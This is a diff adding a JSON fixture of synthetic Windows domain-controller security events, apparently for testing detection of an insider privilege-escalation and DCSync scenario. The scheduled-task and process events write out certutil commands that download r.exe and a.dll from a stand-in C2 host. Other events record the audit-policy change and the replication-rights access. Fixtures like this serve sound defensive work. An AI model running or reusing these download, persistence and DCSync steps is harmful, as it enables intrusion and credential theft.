@@ -1,0 +1,17 @@
+{
+  "schema_version": 1,
+  "computer": "DC01.contoso.lab",
+  "scenario": "Synthetic insider privilege escalation and DCSync lateral movement",
+  "events": [
+    {"EventId": 4740, "TimeCreated": "2026-11-25T04:01:00Z", "Computer": "DC01.contoso.lab", "Data": {"TargetUserName": "fin-analyst01"}},
+    {"EventId": 4740, "TimeCreated": "2026-11-25T04:01:12Z", "Computer": "DC01.contoso.lab", "Data": {"TargetUserName": "fin-analyst02"}},
+    {"EventId": 4740, "TimeCreated": "2026-11-25T04:01:25Z", "Computer": "DC01.contoso.lab", "Data": {"TargetUserName": "fin-analyst03"}},
+    {"EventId": 4720, "TimeCreated": "2026-11-25T04:05:00Z", "Computer": "DC01.contoso.lab", "Data": {"TargetUserName": "svc-audit-temp", "SubjectUserName": "ops-sec01"}},
+    {"EventId": 4728, "TimeCreated": "2026-11-25T04:06:00Z", "Computer": "DC01.contoso.lab", "Data": {"TargetUserName": "Domain Admins", "MemberName": "CN=svc-audit-temp,OU=Service,DC=contoso,DC=lab", "SubjectUserName": "ops-sec01"}},
+    {"EventId": 4648, "TimeCreated": "2026-11-25T04:07:30Z", "Computer": "SRV-FILE02.contoso.lab", "Data": {"SubjectUserName": "ops-sec01", "TargetUserName": "svc-audit-temp", "TargetServerName": "DC01.contoso.lab"}},
+    {"EventId": 4698, "TimeCreated": "2026-11-25T04:08:15Z", "Computer": "DC01.contoso.lab", "Data": {"SubjectUserName": "svc-audit-temp", "TaskName": "\\Microsoft\\Windows\\UpdateCheck", "TaskContent": "C:\\Users\\Public\\sync.bat && certutil -urlcache -split -f https://c2.example.invalid/r.exe"}},
+    {"EventId": 4688, "TimeCreated": "2026-11-25T04:09:00Z", "Computer": "DC01.contoso.lab", "Data": {"SubjectUserName": "svc-audit-temp", "CommandLine": "certutil.exe -urlcache -split -f https://c2.example.invalid/a.dll C:\\ProgramData\\a.dll"}},
+    {"EventId": 4719, "TimeCreated": "2026-11-25T04:10:00Z", "Computer": "DC01.contoso.lab", "Data": {"SubjectUserName": "svc-audit-temp"}},
+    {"EventId": 4662, "TimeCreated": "2026-11-25T04:11:00Z", "Computer": "DC01.contoso.lab", "Data": {"SubjectUserName": "svc-audit-temp", "Properties": "Replicating Directory Changes {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}"}}
+  ]
+}
